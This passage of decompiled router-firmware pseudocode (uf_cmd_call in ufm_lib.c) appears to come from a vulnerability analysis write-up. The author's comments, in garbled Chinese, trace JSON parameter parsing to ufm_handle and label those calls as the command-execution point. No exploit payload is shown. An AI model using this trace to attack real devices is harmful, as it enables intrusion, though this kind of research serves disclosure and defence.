class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line">LABEL_86:</span><br><span class="line">  addr_20 = *(_DWORD *)(addr + <span class="number">20</span>);</span><br><span class="line">  LOBYTE(_20_23_is_data[<span class="number">1</span>]) = *(_BYTE *)(addr + <span class="number">41</span>);</span><br><span class="line">  addr_40 = *(_BYTE *)(addr + <span class="number">40</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">2</span>] = addr_20;</span><br><span class="line">  addr_32 = *(_DWORD *)(addr + <span class="number">32</span>);</span><br><span class="line">  BYTE1(_20_23_is_data[<span class="number">1</span>]) = addr_40;</span><br><span class="line">  addr_43 = *(_BYTE *)(addr + <span class="number">43</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">18</span>] = addr_32;</span><br><span class="line">  addr_24 = *(_DWORD *)(addr + <span class="number">24</span>);</span><br><span class="line">  BYTE1(_20_23_is_data[<span class="number">4</span>]) = addr_43;</span><br><span class="line">  addr_44 = *(_BYTE *)(addr + <span class="number">44</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">3</span>] = addr_24;</span><br><span class="line">  addr_0 = *(_DWORD *)addr;</span><br><span class="line">  BYTE2(_20_23_is_data[<span class="number">4</span>]) = addr_44;</span><br><span class="line">  _20_23_is_data[<span class="number">7</span>] = addr_0;                   <span class="comment">// 7è¿™ä¸ªä½ç½®=addr[0]çš„å€¼</span></span><br><span class="line">  <span class="keyword">if</span> ( g_info &amp;&amp; !addr_0 )</span><br><span class="line">    _20_23_is_data[<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line">  data_2 = (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">20</span>];</span><br><span class="line">  LOBYTE(_20_23_is_data[<span class="number">8</span>]) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">20</span>] )                    <span class="comment">// ä¸ä¼šè¿›å»</span></span><br><span class="line">  &#123;</span><br><span class="line">    v52 = _20_23_is_data[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;update&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_93;</span><br><span class="line">    v53 = (<span class="type">int</span> *)addr;</span><br><span class="line">    <span class="keyword">if</span> ( _20_23_is_data[<span class="number">7</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_172:</span><br><span class="line">      v75 = *v53;</span><br><span class="line">LABEL_173:</span><br><span class="line">      <span class="keyword">if</span> ( !v75 &amp;&amp; g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)para networkId:%s, groupId:%s!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">538</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">9</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">10</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;get&quot;</span>)</span><br><span class="line">        &amp;&amp; ((v76 = _20_23_is_data[<span class="number">14</span>], !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">14</span>], <span class="string">&quot;configPath&quot;</span>))</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configVersion&quot;</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configDefault&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">15</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_184;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">14</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      _20_23_is_data[<span class="number">24</span>] = find_module_info(v77, &amp;_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">      v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">LABEL_184:</span><br><span class="line">      <span class="keyword">if</span> ( v78 )</span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_BYTE *)(_20_23_is_data[<span class="number">0</span>] + <span class="number">48</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          pthread_mutex_lock(v78 + <span class="number">112</span>);</span><br><span class="line">          v98 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">if</span> ( _sigsetjmp(v96, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_unlock(v98 + <span class="number">112</span>);</span><br><span class="line">            _pthread_unwind_next(v96);</span><br><span class="line">          &#125;</span><br><span class="line">          _pthread_register_cancel(v96);</span><br><span class="line">          v80 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">12</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v80 &amp;&amp; *v80 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">                <span class="number">579</span>,</span><br><span class="line">                uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">                v80,</span><br><span class="line">                _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(</span><br><span class="line">              uf_log,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">              <span class="number">583</span>,</span><br><span class="line">              uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">              _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);<span class="comment">// å‘½ä»¤æ‰§è¡Œç‚¹</span></span><br><span class="line">          pthread_mutex_unlock(_20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          _pthread_unregister_cancel(v96);</span><br><span class="line">LABEL_211:</span><br><span class="line">          v82 = addr;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_212;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">      &#125;</span><br><span class="line">      v81 = *(<span class="type">const</span> <span class="type">char</span> **)(v79 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v81 &amp;&amp; *v81 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          uf_log_printf(</span><br><span class="line">            uf_log,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">            <span class="number">593</span>,</span><br><span class="line">            uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">            (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">            (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">            v81,</span><br><span class="line">            v78 + <span class="number">112</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">597</span>,</span><br><span class="line">          uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">          v78 + <span class="number">112</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);    <span class="comment">// å‘½ä»¤æ‰§è¡Œç‚¹</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_211;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>]) )</span><br><span class="line">      v54 = (<span class="type">char</span> *)dword_4364AC;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v54 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    _20_23_is_data[<span class="number">10</span>] = (<span class="type">int</span>)v54;</span><br><span class="line">    _20_23_is_data[<span class="number">9</span>] = dword_4364A8;</span><br><span class="line">LABEL_171:</span><br><span class="line">    v53 = (<span class="type">int</span> *)addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_172;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(_20_23_is_data[<span class="number">20</span>], <span class="string">&#x27;&#125;&#x27;</span>) || <span class="built_in">strchr</span>(data_2, <span class="string">&#x27;]&#x27;</span>) )<span class="comment">// å¦‚æœdataæ®µä¸­æœ‰]æˆ–&#125;,æ˜¾ç„¶è¿›å»</span></span><br><span class="line">  &#123;</span><br><span class="line">    _20_23_is_data[<span class="number">23</span>] = json_tokener_parse(data_2, v49);</span><br><span class="line">    <span class="keyword">if</span> ( _20_23_is_data[<span class="number">23</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)start param parse:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>, <span class="number">142</span>, data_2);</span><br><span class="line">      data_4 = json_object_get_object(_20_23_is_data[<span class="number">23</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( data_4 )</span><br><span class="line">        v56 = *(<span class="type">int</span> **)(data_4 + <span class="number">32</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v56 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v56 )</span><br><span class="line">      &#123;</span><br><span class="line">        v57 = *v56;</span><br><span class="line">        v58 = *v56;</span><br><span class="line">        v59 = v56[<span class="number">1</span>];</span><br><span class="line">        v56 = (<span class="type">int</span> *)v56[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v58, <span class="string">&quot;module&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          _20_23_is_data[<span class="number">15</span>] = json_object_get_string(v59);</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)para-module:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v57, <span class="string">&quot;device&quot;</span>) || *(_DWORD *)(addr + <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;groupId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">10</span>] = json_object_get_string(v59);</span><br><span class="line">            LOBYTE(_20_23_is_data[<span class="number">8</span>]) = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;networkId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">9</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;sn&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( json_object_get_type(v59) == <span class="number">5</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              _20_23_is_data[<span class="number">19</span>] = json_object_array_length(v59);</span><br><span class="line">              <span class="keyword">if</span> ( _20_23_is_data[<span class="number">19</span>] &gt; <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                idx = json_object_array_get_idx(v59, <span class="number">0</span>);</span><br><span class="line">                _20_23_is_data[<span class="number">18</span>] = json_object_get_string(idx);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;configId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">11</span>] = json_object_get_string(v59);</span><br><span class="line">            <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)param configId:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;configTime&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">12</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;currentTime&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">13</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;buffer&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">16</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;file&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">17</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;existIndepend&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v62 = json_object_get_string(v59);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v62, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">              BYTE2(_20_23_is_data[<span class="number">1</span>]) = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v60 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(v59);</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)device:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>, <span class="number">149</span>, v60);</span><br><span class="line">          <span class="keyword">if</span> ( v60 )</span><br><span class="line">            *(_DWORD *)(addr + <span class="number">16</span>) = strdup(v60);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">7</span>] )                 <span class="comment">// è¿™é‡Œä¸è¿›å»</span></span><br><span class="line">      &#123;</span><br><span class="line">        v63 = _20_23_is_data[<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">10</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>])</span><br><span class="line">            || _20_23_is_data[<span class="number">15</span>] &amp;&amp; sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">15</span>]) )</span><br><span class="line">          &#123;</span><br><span class="line">            v64 = (<span class="type">char</span> *)dword_4364AC;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v64 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          _20_23_is_data[<span class="number">10</span>] = (<span class="type">int</span>)v64;</span><br><span class="line">          v63 = _20_23_is_data[<span class="number">9</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        v65 = _20_23_is_data[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !v63 )</span><br><span class="line">        &#123;</span><br><span class="line">          _20_23_is_data[<span class="number">9</span>] = dword_4364A8;</span><br><span class="line">          v65 = _20_23_is_data[<span class="number">10</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v65 )</span><br><span class="line">        &#123;</span><br><span class="line">          v66 = <span class="built_in">strlen</span>(v65);</span><br><span class="line">          <span class="keyword">if</span> ( v66 &gt;= <span class="number">0x12</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v50 = <span class="string">&quot;ERROR (%s %s %d)groupId oversize %d&quot;</span>;</span><br><span class="line">LABEL_142:</span><br><span class="line">            v51 = <span class="string">&quot;detect_gid_nid_invalid&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">          &#125;</span><br><span class="line">          v67 = (<span class="type">char</span> *)v65;</span><br><span class="line">          v68 = (<span class="type">char</span> *)(v65 + v66);</span><br><span class="line">          <span class="keyword">while</span> ( v67 != v68 )</span><br><span class="line">          &#123;</span><br><span class="line">            v69 = *v67++;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v69 - <span class="number">48</span>) &gt;= <span class="number">0xA</span>u )</span><br><span class="line">            &#123;</span><br><span class="line">              v50 = <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, pure number need!&quot;</span>;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_142;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v70 = <span class="built_in">strlen</span>(_20_23_is_data[<span class="number">9</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( v70 &gt;= <span class="number">0x22</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v50 = <span class="string">&quot;ERROR (%s %s %d)networkId 